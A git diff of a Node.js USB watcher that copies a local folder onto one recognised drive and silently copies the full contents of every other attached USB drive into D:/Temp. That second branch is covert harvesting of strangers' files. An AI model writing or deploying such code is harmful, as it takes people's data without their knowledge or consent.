@@ -2,13 +2,13 @@ import {list} from "drivelist"
 import {usb} from "usb"
 import fs from "fs"
 
-let args = ["{CF4327A7-CF04-40EB-869C-120E0BC238B6}", "D:/Temp/", "Backup/"]
+let args = ["{0A568C21-BD20-4D90-89CD-E73184019D02}", "D:/Temp/", "Backup/"]
 
 process.argv.slice(2, 5).forEach((value, index) => {
     args[index] = value
 })
 
-usb.on("attach", async () => {
+async function usbOn() {
     let mountpoints = [];
     (await list()).forEach(drive => {
         if (drive.isRemovable && drive.isUSB) {
@@ -16,14 +16,20 @@ usb.on("attach", async () => {
         }
     })
     mountpoints.forEach(mountpoint => {
-        fs.readFile(mountpoint+"System Volume Information/IndexerVolumeGuid", "utf8", (err, data) => {
-            if (! err) {
+        fs.readFile(mountpoint + "System Volume Information/IndexerVolumeGuid", "utf16le", (err, data) => {
+            if (!err) {
                 if (data === args[0]) {
-                    fs.cpSync(args[1], mountpoint+args[2], {recursive: true})
-                } else if (! fs.existsSync(args[1]+data)) {
-                    fs.cpSync(mountpoint, args[1]+data, {recursive: true})
+                    setTimeout((path) => {
+                        if (fs.existsSync(args[1])) {
+                            fs.cpSync(args[1], path+args[2], {recursive: true})
+                        }
+                    }, 500, [mountpoint])
+                } else if (!fs.existsSync(args[1] + data)) {
+                    fs.cpSync(mountpoint, args[1] + data, {recursive: true})
                 }
             }
         })
     })
-})
+}
+
+usb.on("attach", () => setTimeout(usbOn, 1000))
